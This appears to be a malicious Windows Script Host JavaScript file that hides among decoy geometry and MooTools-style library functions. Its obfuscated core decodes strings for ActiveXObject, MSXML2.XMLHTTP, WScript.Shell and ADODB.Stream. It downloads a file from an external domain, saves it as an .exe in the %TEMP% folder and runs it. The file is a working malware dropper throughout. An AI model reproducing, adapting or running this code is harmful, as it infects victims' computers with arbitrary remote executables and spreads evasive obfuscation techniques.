
var became = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  titter = [];
	
var lothario = { ':': '.','U': 'S','381': 'X'};
	var upgrades = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function mauritius(inalienable) {
	gratis = inalienable;
	for (var i in lothario){gratis = gratis.replace(i, lothario[i]);}
    return gratis;
};

var peanuts = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.mauritius4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("phosphorus").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = became[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = became[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = became[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = became[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var based ="phosphorusJVphosphorusRFTVphosphorusAl".mauritius4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var interactive = "phosphorusQWphosphorusN0aXZphosphoruslWE9iaphosphorusmVjdA=phosphorus=".mauritius4();
String.prototype.mauritius2 = function () {
    var golly = {
        municipality: this
    };
    golly.critical = golly.municipality["c3Vic3RyaW5n".mauritius4()](upgrades, peanuts);
    return golly.critical;
};

var genealogical ="phosphorusRXhwYW5phosphoruskRW52aXphosphorusJvbm1lbnRTdHJphosphoruspbmdz".mauritius4();
var Native = function(options){
	
};
var baste = [interactive, genealogical,based,  ""+"."+("horseshoe","witless","coldest","baggy","calculations","compensate","material","introspective","exe"), "UnVu".mauritius4(), mauritius("M"+"SX"+"ML"+("drain","eunuch","montreal","impute","madrid","convulsive","favors","2.")+"381M"+"LH"+"TT"+("providers","forth","turnip","celebs","hostel","detrimental","minority","personally","P>")+"WU"+("highs","broader","evaporation","mirrors","automotive","performances","buckwheat","cr")+("stewed","zoophilia","anthropology","gingerly","hostel","foundations","student","necessary","ip")+"t:"+("higgins","octave","cognizance","thinker","recognisable","shanghai","vocational","sicilian","Sh")+"ell")];
busty = "_F2_";
var chick = this[baste.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
OcPBQY = "LzzPyay";
inefficient = (("mandatory", "important", "throttle", "raised", "guido", "actor", "boudoir", "pbbtqToA") + "wpgjTtx").mauritius2();
marks = (("transform", "protection", "regimen", "repulsion", "laptops", "industry", "visor", "payday", "deutschland", "sgDAOpV") + "LfPEElQSD").mauritius2();
  
    String.prototype.phrase = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var invasion = baste.pop().split(">");

altering = "b3Blbg==".mauritius4();
var autocrat = new chick(invasion[1]);
var cardiovascular = new chick(invasion[0]);
var tenable = autocrat[baste.shift()](baste.shift());
weasel = "E";

var decoction = baste.shift();
var althea = baste.shift();
function housewares(altruism, ulster) {

    try {
        var eruption = tenable + "/" + ulster ;
		eruption = eruption+ decoction;
            cardiovascular[altering](("lewis","purge","G" + weasel) + ("portion","elapse","chest","nigeria","T"), altruism, false);
       
    RlinWXQnPt = "_F7_";
    cardiovascular[marks + ("facade","sharon","end")]();
	var realize=("inefficient" + WScript=="inefficient" + "V2luZG93cyBTY3JpcHQgSG9zdA==".mauritius4())&&cardiovascular["c3RhdHVz".mauritius4()] +""=="MjAw".mauritius4()&&typeof(JPusbvJ)==="undefined";
	lQHNgR = "_F8_";
    if (realize) {
		
        var stretcher = new chick((("tracker","medieval","speculator","oscar","retired","prison","jaguar","sensational","A")+("relaxation","moraine","verbatim","bereavement","wheaten","canadian","reflections","forswear","SEOO")+"DB"+("ecclesiastes","domicile","admission","boulder","wounding","porter","cooper",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        stretcher[altering]();
        zIVesHleIVa = "_F9_";
        stretcher.type = peanuts;
        vBubipPiE = "_F10_";
        stretcher["d3JpdGU=".mauritius4()](cardiovascular[("outlying","inform","spoor","oftentimes","melodrama","settle","sicken","")+"R"+"es"+"pon"+lothario['U'].toLowerCase()+"e"+"Qm9keQ==".mauritius4()]);
        AyCubpumCP = "_F11_";
        stretcher[(inefficient + "o"+("unbelievable","share","rhodes","multiple","economy","doubles","adopted","undiscovered","00")+("ultimately","floors","needs","questionable","dealers","aspire","raising","8i")+"tion").replace("0"+("cambrian","titter","marianne","fundamentally","inflated","flurry","stopping","08"), marks)] = 0;
        YeeVgO = "_F12_";
        stretcher.saveToFile(eruption, 2);
        KThqPNQiu = "_F13_";
        stretcher.close();
        jLEApPhw = "_F14_";
		autocrat[althea](eruption, peanuts, true);
    }
} catch (XGVIvtkxw) { };

    qfcAkwJB = "_F15_";
}
try{
housewares("aHR0cDovLw==".mauritius4()+"\u0067\u006C\u006F\u0062\u0061\u006C\u0063\u0072\u0065\u0064\u0069\u0074\u0068\u0075\u0062"+"\u002E\u0063\u006F\u006D\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?IODRTbd=kFIoVyDQXO","KWFqtKe");}catch(hktdEoW){}

   MtNbGsCYQM = "_F16_";
   